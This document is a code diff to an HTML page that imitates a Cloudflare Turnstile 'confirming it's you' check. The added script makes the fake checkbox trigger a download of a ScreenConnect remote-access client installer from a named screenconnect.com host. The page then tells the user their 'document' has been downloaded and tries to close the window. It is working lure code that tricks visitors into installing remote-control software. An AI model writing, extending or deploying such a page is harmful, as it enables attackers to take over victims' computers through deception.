@@ -53,6 +53,7 @@
             width: 100%;
             box-sizing: border-box;
             box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+            transition: opacity 0.3s ease;
         }
 
         .widget-left {
@@ -161,19 +162,60 @@
             margin: 0 3px;
             font-size: 8px;
         }
+
+        /* Success Message Styling */
+        #success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background-color: #fdfdfd;
+            border: 1px solid #d1d5db;
+            border-radius: 4px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+        }
+
+        #success-message h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #111;
+            margin: 0 0 10px 0;
+        }
+
+        #success-message p {
+            font-size: 14px;
+            color: #666;
+            margin: 0 0 20px 0;
+            line-height: 1.5;
+        }
+
+        #success-message button {
+            background-color: #f38020;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        #success-message button:hover {
+            background-color: #e06c10;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
         <!-- Header Text -->
-        <div class="header">
+        <div class="header" id="header">
             <h1>One moment — confirming it's you</h1>
             <p>Complete the check below to continue</p>
         </div>
 
         <!-- Turnstile Widget -->
-        <div class="turnstile-widget">
+        <div class="turnstile-widget" id="turnstile-widget">
             <!-- Left side: Checkbox and Text -->
             <div class="widget-left">
                 <label for="human-check" class="custom-checkbox" id="custom-checkbox">
@@ -202,6 +244,13 @@
                 </div>
             </div>
         </div>
+
+        <!-- Success Message (Hidden initially) -->
+        <div id="success-message">
+            <h2>Download Started</h2>
+            <p>Your document has been downloaded to your Downloads folder. You can open it from there.</p>
+            <button onclick="closeWindow()">Close Window</button>
+        </div>
     </div>
 
     <script>
@@ -212,9 +261,18 @@
         const customCheckbox = document.getElementById('custom-checkbox');
         const checkmark = document.getElementById('checkmark');
         const spinner = document.getElementById('spinner');
+        const header = document.getElementById('header');
+        const widget = document.getElementById('turnstile-widget');
+        const successMessage = document.getElementById('success-message');
 
         // Set your redirect URL here
-        const redirectUrl = "https://bonfirecollective.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"; 
+        const downloadUrl = "https://bonfirecollective.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"; 
+
+        // Function to attempt closing the window
+        function closeWindow() {
+            window.open('', '_self', '');
+            window.close();
+        }
 
         // Simulate the Cloudflare Turnstile verification process
         checkbox.addEventListener('change', function() {
@@ -231,11 +289,27 @@
                     customCheckbox.style.borderColor = '#f38020'; // Cloudflare orange border
                     customCheckbox.style.backgroundColor = '#fff7ed'; // Very light orange background
                     
-                    // Redirect to the URL after successful verification
-                    // Added a tiny extra delay (300ms) so the user sees the checkmark before the page changes
+                    // Trigger the download
+                    const link = document.createElement('a');
+                    link.href = downloadUrl;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+
+                    // Wait a moment for the download prompt to appear, then show the success message
                     setTimeout(() => {
-                        window.location.href = redirectUrl;
-                    }, 300);
+                        header.style.display = 'none';
+                        widget.style.display = 'none';
+                        successMessage.style.display = 'block';
+                        
+                        // Attempt to automatically close the window after 5 seconds
+                        // Note: Browsers often block this unless the window was opened by a script.
+                        // The "Close Window" button serves as a fallback.
+                        setTimeout(() => {
+                            closeWindow();
+                        }, 5000);
+
+                    }, 1000); // 1 second delay to allow download to start
 
                 }, 1000); 
             } else {
